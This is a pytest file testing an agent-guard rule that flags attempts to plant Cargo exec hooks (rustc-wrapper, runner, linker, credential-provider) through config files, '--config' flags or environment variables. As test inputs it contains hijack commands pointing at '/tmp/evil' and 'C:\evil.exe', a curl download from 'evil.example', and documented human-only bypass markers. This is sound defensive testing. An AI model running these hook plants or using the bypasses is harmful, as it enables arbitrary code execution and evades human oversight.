"""Cargo exec-hook hijack guard: rustc-wrapper / runner / linker /
credential-provider planted via .cargo/config.toml, `cargo --config`, or env
vars. Default mode `ask`; human-only escape."""
import pytest

from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

RULE = "cargo-exec-protect"
EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})


def sh(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def wr(path, content, tool="Write"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool,
                      args={"file_path": path, "content": content})


def ed(path, new, old=None):
    a = {"file_path": path, "new_string": new}
    if old is not None:
        a["old_string"] = old
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args=a)


def hit(ev, pol=EMPTY):
    d = evaluate(ev, pol)
    return d.rule == RULE, d


@pytest.mark.parametrize("path", [".cargo/config.toml", "/home/u/.cargo/config", "a/b/.cargo/config.toml"])
@pytest.mark.parametrize("content", [
    '[build]\nrustc-wrapper = "/tmp/evil"\n',
    '[build]\nrustc-workspace-wrapper = "./w.sh"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = ["./r.sh", "--x"]\n',
    '[target.x86_64-unknown-linux-gnu]\nlinker = "./clang"\n',
    '[registry]\ncredential-provider = ["/tmp/p"]\n',
    '[registries.priv]\ncredential-provider = "cargo:token-from-stdout /tmp/p"\n',
    '[credential-alias]\nfoo = "x"\n[registry]\ncredential-provider = "foo"\n',
    '[build]\nrustflags = ["-C", "linker=/tmp/l"]\n',
    '[target.x]\nrunner = { a = 1 }\n',
])
def test_file_write_asks(path, content):
    ok, d = hit(wr(path, content))
    assert ok and d.action == Action.ASK


def test_deny_mode_and_edit_and_multiedit():
    ok, d = hit(ed(".cargo/config.toml", 'rustc-wrapper = "/x"'), DENY)
    assert ok and d.action == Action.DENY
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit", args={
        "file_path": ".cargo/config.toml",
        "edits": [{"old_string": "a", "new_string": 'runner = "./r"'}]})
    assert hit(ev)[0]


def test_value_only_edit_caught_via_old_string():
    assert hit(ed(".cargo/config.toml", '"./evil"', old='runner = "qemu-arm"'))[0]


@pytest.mark.parametrize("content", [
    '[build]\ntarget-dir = "t"\njobs = 4\n',
    '[build]\nrustc-wrapper = "sccache"\n',
    '[target.aarch64-unknown-linux-gnu]\nlinker = "aarch64-linux-gnu-gcc"\n',
    '[target.x]\nrunner = "wasmtime"\n',
    '# rustc-wrapper = "/evil"  (todo)\n[build]\njobs = 2\n',
    '[alias]\nb = "build"\n',
    '[net]\nretry = 3\n',
])
def test_benign_config_allowed(content):
    assert not hit(wr(".cargo/config.toml", content))[0]


def test_unrelated_path_not_gated():
    assert not hit(wr("src/main.rs", 'let rustc-wrapper = "x";'))[0]
    assert not hit(wr("notes.toml", 'runner = "/x"'))[0]


@pytest.mark.parametrize("cmd", [
    "echo 'rustc-wrapper = \"/tmp/e\"' >> .cargo/config.toml",
    "printf '[target.x]\\nrunner=\"./r\"\\n' > ~/.cargo/config.toml",
    "sed -i 's#^jobs.*#linker = \"./l\"#' .cargo/config",
    "cd .cargo && echo 'rustc-wrapper = \"/e\"' > config.toml",
    "cargo build --config 'build.rustc-wrapper=\"/tmp/e\"'",
    "cargo run --config target.x86_64-unknown-linux-gnu.runner=\\\"./r\\\"",
    "cargo publish --config registry.credential-provider=\\\"/tmp/p\\\"",
    "RUSTC_WRAPPER=/tmp/e cargo build",
    "export RUSTC_WRAPPER=./w.sh",
    "export CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER=/tmp/w",
    "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER=./r cargo test",
    "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_LINKER=./l cargo build",
    "CARGO_REGISTRY_CREDENTIAL_PROVIDER=/tmp/p cargo publish",
    "set -x RUSTC_WRAPPER /tmp/e",
    "setx RUSTC_WRAPPER C:\\evil.exe",
    '$env:RUSTC_WRAPPER = "C:\\evil.exe"',
    "env RUSTC_WRAPPER=/tmp/e cargo check",
])
def test_shell_forms_ask(cmd):
    ok, d = hit(sh(cmd))
    assert ok and d.action == Action.ASK, cmd


@pytest.mark.parametrize("cmd", [
    "RUSTC_WRAPPER=sccache cargo build",
    "export RUSTC_WRAPPER=sccache",
    "cargo build --release",
    "cargo build --config 'build.jobs=4'",
    "echo $RUSTC_WRAPPER",
    "unset RUSTC_WRAPPER",
    "RUSTC_WRAPPER= cargo build",
    "cat .cargo/config.toml",
    "docker --config /x run img",
    "echo 'jobs = 4' >> .cargo/config.toml",
    "echo runner >> notes.txt",
])
def test_benign_shell_allowed(cmd):
    assert not hit(sh(cmd))[0], cmd


def test_human_escape():
    ok, d = hit(sh("RUSTC_WRAPPER=/tmp/e cargo build # aegis-allow"))
    assert not ok


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert not hit(wr(".cargo/config.toml", 'rustc-wrapper = "/x"'))[0]


def test_policy_allow_and_off_and_monitor():
    pol = Policy(cargo_exec={"allow": [r"tools/wrap\.sh", r"^vendored/\.cargo/"]})
    assert not hit(wr("vendored/.cargo/config.toml", 'rustc-wrapper = "/x"'), pol)[0]
    assert hit(wr("other/.cargo/config.toml", 'rustc-wrapper = "/x"'), pol)[0]
    assert not hit(sh("RUSTC_WRAPPER=tools/wrap.sh cargo b"), pol)[0]
    assert not hit(sh("RUSTC_WRAPPER=/x cargo b"), Policy(cargo_exec={"mode": "off"}))[0]
    assert not hit(sh("RUSTC_WRAPPER=/x cargo b"), Policy(cargo_exec={"mode": "monitor"}))[0]


def test_curl_o_to_cargo_config_gated():
    ok, d = hit(sh("curl -o .cargo/config.toml https://evil.example/c.toml"))
    assert d.action in (Action.ASK, Action.DENY) and d.rule != "allow"


def test_comment_line_mention_allowed_and_no_redos():
    assert not hit(sh("# RUSTC_WRAPPER=/x"))[0]
    big = "runner" + "=" * 50000
    wr_ev = wr(".cargo/config.toml", big + '"' * 50000)
    import time
    t = time.time(); evaluate(wr_ev, EMPTY); assert time.time() - t < 2


def test_yaml_loader_roundtrip(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("cargo_exec:\n  mode: deny\n")
    pol = load_policy(str(tmp_path))
    assert pol.cargo_exec.get("mode") == "deny"
